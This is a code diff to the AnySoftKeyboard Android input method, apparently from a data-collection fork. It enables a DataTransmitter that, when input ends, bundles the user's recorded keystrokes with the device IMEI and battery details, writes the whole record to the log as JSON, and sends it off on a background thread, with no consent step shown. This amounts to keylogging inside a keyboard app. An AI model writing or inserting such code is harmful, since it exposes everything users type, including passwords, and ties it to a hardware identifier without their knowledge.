@@ -19,6 +19,7 @@ package com.anysoftkeyboard;
 import android.content.Context;
 import android.content.Intent;
 import android.content.res.Configuration;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.os.IBinder;
 import android.support.annotation.NonNull;
@@ -26,6 +27,7 @@ import android.support.annotation.Nullable;
 import android.support.annotation.RequiresApi;
 import android.support.v4.view.ViewCompat;
 import android.support.v7.app.AlertDialog;
+import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.view.KeyEvent;
 import android.view.View;
@@ -40,8 +42,9 @@ import android.widget.Toast;
 
 import com.anysoftkeyboard.api.KeyCodes;
 import com.anysoftkeyboard.base.utils.Logger;
+import com.anysoftkeyboard.datacollection.BatteryInfo;
 import com.anysoftkeyboard.datacollection.DataCollection;
-//import com.anysoftkeyboard.datacollection.DataTransmitter;
+import com.anysoftkeyboard.datacollection.DataTransmitter;
 import com.anysoftkeyboard.datacollection.ExtendedKeyCodes;
 import com.anysoftkeyboard.datacollection.Keystroke;
 import com.anysoftkeyboard.datacollection.Word;
@@ -71,7 +74,7 @@ import com.menny.android.anysoftkeyboard.R;
 
 import net.evendanan.pixel.GeneralDialogController;
 
-import java.io.IOException;
+import java.text.DateFormat;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Date;
@@ -227,10 +230,12 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardIncognito {
     @Override
     public void onStartInput(EditorInfo attribute, boolean restarting) {
         super.onStartInput(attribute, restarting);
+        Logger.v(TAG, "onStartInput start");
         setKeyboardStatusIcon();
     }
 
     @Override
+    @RequiresApi(api = Build.VERSION_CODES.O)
     public void onStartInputView(final EditorInfo attribute, final boolean restarting) {
         Logger.v(TAG, "onStartInputView(EditorInfo{imeOptions %d, inputType %d}, restarting %s",
                 attribute.imeOptions, attribute.inputType, restarting);
@@ -239,6 +244,16 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardIncognito {
 
         //dc-- DataCollection init data collection
         dataCollection = new DataCollection();
+        TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+
+        //dc-- DataCollection set the device ID of data collection if permitted
+        try{
+            dataCollection.setDeviceId(tm.getImei());
+        }catch (SecurityException ex){
+            dataCollection.setDeviceId("No Permission");
+        }
+        dataCollection.setStartPoint();
+//        DateFormat dateFormat = android.text.format.DateFormat.getDateFormat(getApplicationContext());
 
         if (mVoiceRecognitionTrigger != null) {
             mVoiceRecognitionTrigger.onStartInputView();
@@ -255,7 +270,9 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardIncognito {
     }
 
     @Override
+    @RequiresApi(api = Build.VERSION_CODES.O)
     public void onFinishInput() {
+        Logger.v(TAG, "onFinishInput start");
         super.onFinishInput();
         // check the word is finish or not when input is finish
         completeWord();
@@ -268,14 +285,21 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardIncognito {
         final InputViewBinder inputView = getInputView();
         if (inputView != null) inputView.resetInputView();
 
-        //dc-- DataTransmitter test write file
-//        if (dataCollection != null) {
-//            DataTransmitter transmitter = new DataTransmitter(getApplicationContext(), dataCollection);
-//
-//            Thread thread = new Thread(transmitter);
-//            thread.start();
-//
-//        }
+        //dc-- DataTransmitter
+        if (dataCollection != null && dataCollection.getKeystrokes().size() > 0) {
+            //set battery info and end point for DataCollection object
+            BatteryInfo batteryInfo = new BatteryInfo((BatteryManager) getSystemService(Context.BATTERY_SERVICE));
+            batteryInfo.setBatteryPercentage(BatteryInfo.getBatteryPercentage(getApplicationContext()));
+            batteryInfo.setBatterLevel(BatteryInfo.getBatteryLevel(getApplicationContext()));
+            dataCollection.setBatteryInfo(batteryInfo);
+            dataCollection.setEndPoint();
+
+            //start the data transmission process
+            DataTransmitter transmitter = new DataTransmitter(getApplicationContext(), dataCollection);
+            Logger.v(TAG, "dc-- DataCollection JSON =  %s", dataCollection.toJsonString());
+            Thread thread = new Thread(transmitter);
+            thread.start();
+        }
 
         dataCollection = null;
     }
